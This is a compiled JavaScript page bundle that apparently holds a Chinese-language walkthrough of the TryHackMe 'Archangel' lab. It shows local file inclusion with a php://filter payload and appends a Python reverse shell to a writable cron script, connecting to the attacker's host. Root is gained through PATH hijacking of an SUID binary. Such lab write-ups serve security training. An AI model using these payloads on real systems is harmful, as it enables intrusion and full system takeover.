"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[3145],{98898:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>i,contentTitle:()=>l,default:()=>h,frontMatter:()=>s,metadata:()=>o,toc:()=>c});var a=t(74848),r=t(28453);const s={sidebar_position:30,tags:["Easy","Linux","LFI","\u5b9a\u65f6\u4efb\u52a1","SUID"],title:"Archangel",description:"Archangel",sidebar_label:"Archangel",slug:"/tryhackme/30"},l="Archangel",o={id:"box/TryHackMe/30",title:"Archangel",description:"Archangel",source:"@site/docs/box/TryHackMe/30.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/30",permalink:"/docs/tryhackme/30",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"LFI",permalink:"/docs/tags/lfi"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"},{label:"SUID",permalink:"/docs/tags/suid"}],version:"current",sidebarPosition:30,frontMatter:{sidebar_position:30,tags:["Easy","Linux","LFI","\u5b9a\u65f6\u4efb\u52a1","SUID"],title:"Archangel",description:"Archangel",sidebar_label:"Archangel",slug:"/tryhackme/30"},sidebar:"boxSidebar",previous:{title:"Git Happens",permalink:"/docs/tryhackme/29"},next:{title:"ColddBox: Easy",permalink:"/docs/tryhackme/31"}},i={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80 - HTTP",id:"80---http",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data --&gt; archangel",id:"www-data----archangel",level:3},{value:"archangel  \u2014&gt; root",id:"archangel---root",level:3}];function d(n){const e={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...n.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(e.h1,{id:"archangel",children:"Archangel"}),"\n",(0,a.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-85-216:~# nmap -sT -p- --min-rate 1000 10.10.220.135\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-21 17:28 BST\nNmap scan report for ip-10-10-220-135.eu-west-1.compute.internal (10.10.220.135)\nHost is up (0.011s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 02:89:E0:F0:EA:EB (Unknown)\n\nNmap done: 1 IP address (1 host up) scanned in 4.31 seconds\n"})}),"\n",(0,a.jsx)(e.h2,{id:"80---http",children:"80 - HTTP"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601182919.png",alt:"20240601182919"})}),"\n",(0,a.jsxs)(e.p,{children:["\u8bbf\u95ee 80 \u7ad9\u70b9, \u6211\u5728\u6b64\u8fdb\u884c\u4e86\u76ee\u5f55\u626b\u63cf\u7b49\u63aa\u65bd, \u4f46\u662f\u6ca1\u6709\u627e\u5230\u53ef\u4ee5\u5229\u7528\u7684\u4f4d\u7f6e, \u4f46\u662f\u6211\u5728\u5176\u4e2d\u53d1\u73b0\u4e00\u4e2a\u57df , \u6240\u4ee5\u6dfb\u52a0 DNS ",(0,a.jsx)(e.code,{children:"mafialive.thm"})," , \u8fdb\u884c\u653b\u51fb, \u8bbf\u95ee\u7ad9\u70b9, \u83b7\u5f97\u4e00\u4e2a flag"]}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601182949.png",alt:"20240601182949"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601182959.png",alt:"20240601182959"})}),"\n",(0,a.jsx)(e.p,{children:"\u6839\u636e\u626b\u63cf\u7684\u7ed3\u679c\u6211\u8bbf\u95ee test.php \u53d1\u73b0\u8fd9\u91cc\u662f\u4e00\u4e2a\u6587\u4ef6\u5305\u542b,"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601183009.png",alt:"20240601183009"})}),"\n",(0,a.jsx)(e.admonition,{type:"tip",children:(0,a.jsxs)(e.ul,{children:["\n",(0,a.jsx)(e.li,{children:"\u5bf9\u4e8e ../ \u662f\u505a\u4e86\u8fc7\u6ee4\u4e86"}),"\n",(0,a.jsx)(e.li,{children:"\u540c\u65f6\u9650\u5236\u4e86\u76ee\u5f55\u4e3a  /var/www/html/development_testing/"}),"\n"]})}),"\n",(0,a.jsxs)(e.p,{children:["\u4f46\u662f\u6211\u8bbf\u95ee /etc/passwd \u4e00\u76f4\u6ca1\u6709\u56de\u663e, \u6240\u4ee5\u6211\u5c1d\u8bd5\u53bb\u9605\u8bfb\u6e90\u7801, \u83b7\u53d6\u5230\u6e90\u7801\u540e\u8fdb\u884c\u89e3\u5bc6 ",(0,a.jsx)(e.a,{href:"https://gchq.github.io/CyberChef/#input=Q1FvOElVUlBRMVJaVUVVZ1NGUk5URDRLUEdoMGJXdytDZ284YUdWaFpENEtJQ0FnSUR4MGFYUnNaVDVKVGtOTVZVUkZQQzkwYVhSc1pUNEtJQ0FnSUR4b01UNVVaWE4wSUZCaFoyVXVJRTV2ZENCMGJ5QmlaU0JFWlhCc2IzbGxaRHd2YURFK0NpQUtJQ0FnSUR3dlluVjBkRzl1UGp3dllUNGdQR0VnYUhKbFpqMGlMM1JsYzNRdWNHaHdQM1pwWlhjOUwzWmhjaTkzZDNjdmFIUnRiQzlrWlhabGJHOXdiV1Z1ZEY5MFpYTjBhVzVuTDIxeWNtOWliM1F1Y0dod0lqNDhZblYwZEc5dUlHbGtQU0p6WldOeVpYUWlQa2hsY21VZ2FYTWdZU0JpZFhSMGIyNDhMMkoxZEhSdmJqNDhMMkUrUEdKeVBnb2dJQ0FnSUNBZ0lEdy9jR2h3Q2dvSklDQWdJQzh2Umt4QlJ6b2dkR2h0ZTJWNGNHeHZNWFF4Ym1kZmJHWXhmUW9LSUNBZ0lDQWdJQ0FnSUNBZ1puVnVZM1JwYjI0Z1kyOXVkR0ZwYm5OVGRISW9KSE4wY2l3Z0pITjFZbk4wY2lrZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2NtVjBkWEp1SUhOMGNuQnZjeWdrYzNSeUxDQWtjM1ZpYzNSeUtTQWhQVDBnWm1Gc2MyVTdDaUFnSUNBZ0lDQWdJQ0FnSUgwS0NTQWdJQ0JwWmlocGMzTmxkQ2drWDBkRlZGc2lkbWxsZHlKZEtTbDdDZ2tnSUNBZ2FXWW9JV052Ym5SaGFXNXpVM1J5S0NSZlIwVlVXeWQyYVdWM0oxMHNJQ2N1TGk4dUxpY3BJQ1ltSUdOdmJuUmhhVzV6VTNSeUtDUmZSMFZVV3lkMmFXVjNKMTBzSUNjdmRtRnlMM2QzZHk5b2RHMXNMMlJsZG1Wc2IzQnRaVzUwWDNSbGMzUnBibWNuS1NrZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0FKYVc1amJIVmtaU0FrWDBkRlZGc25kbWxsZHlkZE93b2dJQ0FnSUNBZ0lDQWdJQ0I5Wld4elpYc0tDZ2tKWldOb2J5QW5VMjl5Y25rc0lGUm9ZWFJ6SUc1dmRDQmhiR3h2ZDJWa0p6c0tJQ0FnSUNBZ0lDQWdJQ0FnZlFvSmZRb2dJQ0FnSUNBZ0lEOCtDaUFnSUNBOEwyUnBkajRLUEM5aWIyUjVQZ29LUEM5b2RHMXNQZ29LQ2c9PQ",children:"CyberChef"})]}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-http",children:"http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php\n"})}),"\n",(0,a.jsx)(e.p,{children:"\u6211\u53d1\u73b0\u6211\u7684\u731c\u89e3\u662f\u6b63\u786e\u7684, \u4f46\u662f\u8bbf\u95ee /etc/passwd \u5c31\u662f\u6ca1\u6709\u56de\u663e, \u7ecf\u8fc7\u63a2\u7a76\u53d1\u73b0 Burp \u6b63\u5e38\u56de\u663e, \u4f46\u662f\u6d4f\u89c8\u5668\u6ca1\u6709\u5185\u5bb9 (\u521a\u5f00\u59cb\u8fd8\u4ee5\u4e3a\u81ea\u5df1\u7684 payload \u6709\u95ee\u9898)"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601183110.png",alt:"20240601183110"})}),"\n",(0,a.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,a.jsx)(e.h3,{id:"www-data",children:"www-data"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601183124.png",alt:"20240601183124"})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601183132.png",alt:"20240601183132"})}),"\n",(0,a.jsx)(e.h3,{id:"www-data----archangel",children:"www-data --\x3e archangel"}),"\n",(0,a.jsx)(e.p,{children:"\u6211\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1, \u5e76\u4e14\u8fd9\u4e2a\u811a\u672c\u6587\u4ef6\u6211\u4eec\u5177\u6709\u53ef\u5199\u6743\u9650, \u6240\u4ee5\u8fdb\u884c\u4fee\u6539\u6765\u83b7\u53d6\u7b2c\u4e8c\u4e2a Shell"}),"\n",(0,a.jsx)(e.pre,{children:(0,a.jsx)(e.code,{className:"language-bash",children:'(remote) www-data@ubuntu:/home/archangel$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don\'t have to run the `crontab\'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user\tcommand\n*/1 *   * * *   archangel /opt/helloworld.sh\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n\n(remote) www-data@ubuntu:/opt$ ls -al\ntotal 16\ndrwxrwxrwx  3 root      root      4096 Nov 20  2020 .\ndrwxr-xr-x 22 root      root      4096 Nov 16  2020 ..\ndrwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles\n-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh\n(remote) www-data@ubuntu:/opt$ cat helloworld.sh \n#!/bin/bash\necho "hello world" >> /opt/backupfiles/helloworld.txt\n(remote) www-data@ubuntu:/opt$ cat << EOF >> helloworld.sh \n> python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.85.216",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'\n> EOF\n(remote) www-data@ubuntu:/opt$ cat helloworld.sh \n#!/bin/bash\necho "hello world" >> /opt/backupfiles/helloworld.txt\npython3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.85.216",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'\n'})}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601183156.png",alt:"20240601183156"})}),"\n",(0,a.jsx)(e.h3,{id:"archangel---root",children:"archangel  \u2014> root"}),"\n",(0,a.jsx)(e.p,{children:"\u5728 archangel  \u7684\u76ee\u5f55\u4e2d\u6211\u53d1\u73b0\u4e00\u4e2a backup \u7a0b\u5e8f, \u5b83\u5177\u6709 root \u7684 SUID \u6743\u9650"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601183210.png",alt:"20240601183210"})}),"\n",(0,a.jsx)(e.p,{children:"\u6211\u4f7f\u7528 String \u67e5\u770b\u4ed6\u7684\u5176\u4e2d\u5b57\u7b26\u4e32\u547d\u4ee4\u53d1\u73b0\u5176\u4f7f\u7528 cp \u4f46\u662f\u6ca1\u6709\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601183221.png",alt:"20240601183221"})}),"\n",(0,a.jsx)(e.p,{children:"\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 PATH \u6765\u5b8c\u6210\u653b\u51fb"}),"\n",(0,a.jsx)(e.p,{children:(0,a.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240601183231.png",alt:"20240601183231"})})]})}function h(n={}){const{wrapper:e}={...(0,r.R)(),...n.components};return e?(0,a.jsx)(e,{...n,children:(0,a.jsx)(d,{...n})}):d(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>l,x:()=>o});var a=t(96540);const r={},s=a.createContext(r);function l(n){const e=a.useContext(s);return a.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function o(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(r):n.components||r:l(n.components),a.createElement(s.Provider,{value:e},n.children)}}}]);